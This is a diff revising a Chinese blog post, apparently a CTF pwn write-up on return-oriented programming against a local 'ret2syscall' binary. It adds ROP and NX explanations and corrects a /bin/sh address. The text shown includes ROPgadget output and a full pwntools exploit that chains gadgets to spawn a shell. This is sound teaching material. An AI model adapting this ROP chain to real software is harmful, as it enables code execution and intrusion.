@@ -123,21 +123,21 @@
 
 
 
-<meta name="description" content="前言通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。 这里我们需要构造的gadget如下 12">
+<meta name="description" content="前言通过一道PWN题目学习ROP。 随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ROP学习">
 <meta property="og:url" content="elssm.github.io/2022/12/29/ROP学习/index.html">
 <meta property="og:site_name" content="ELSSM&#39;s Blog">
-<meta property="og:description" content="前言通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。 这里我们需要构造的gadget如下 12">
+<meta property="og:description" content="前言通过一道PWN题目学习ROP。 随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="/2022/12/29/ROP学习/1.png">
 <meta property="og:image" content="/2022/12/29/ROP学习/2.png">
 <meta property="og:image" content="/2022/12/29/ROP学习/3.png">
-<meta property="og:updated_time" content="2022-12-29T10:43:02.414Z">
+<meta property="og:updated_time" content="2022-12-30T04:18:31.235Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ROP学习">
-<meta name="twitter:description" content="前言通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。 这里我们需要构造的gadget如下 12">
+<meta name="twitter:description" content="前言通过一道PWN题目学习ROP。 随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执">
 <meta name="twitter:image" content="/2022/12/29/ROP学习/1.png">
 
 
@@ -368,7 +368,9 @@
       
 
       
-        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。</p>
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>通过一道PWN题目学习ROP。</p>
+<p>随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>ROPgadget工具可以帮助你寻找合适的gadgets，在编写你的<code>ROP exp</code>的时候有很大作用。ROPgadget支持x86, x64, ARM, ARM64, PowerPC, SPARC和MIPS架构下的ELF/PE/Mach-O文件格式。</p>
 <p>这里我们需要构造的gadget如下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,["/bin/sh"]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line">int 0x80</span><br><span class="line">==&gt; execve("/bin/sh",NULL,NULL)</span><br></pre></td></tr></table></figure>
 <h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>checksec查看开启了哪些保护机制</p>
@@ -388,8 +390,10 @@
 <p>最后我们寻找<code>int</code>，地址为<code>0x08049421</code></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "int"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>
 <p>因为ebp寄存器中需要写入<code>/bin/sh</code>，因此我们还需要在程序中找到<code>/bin/sh</code>的地址</p>
-<p>在<code>ghidra</code>中全局搜索发现地址为<code>0x08049421</code></p>
+<p>在<code>ghidra</code>中全局搜索发现地址为<code>0x80be408</code></p>
 <p><img src="/2022/12/29/ROP学习/3.png" alt="3"></p>
+<p>或者通过python编写脚本获取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2syscall'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.search(<span class="string">b'/bin/sh'</span>)</span><br><span class="line">&lt;generator object ELF.search at <span class="number">0x7f024f030db0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="string">'0x80be408'</span></span><br></pre></td></tr></table></figure>
 <h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>编写<code>exp</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_80h = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*<span class="number">112</span>, pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>本地执行<code>exp</code>获取<code>shell</code></p>
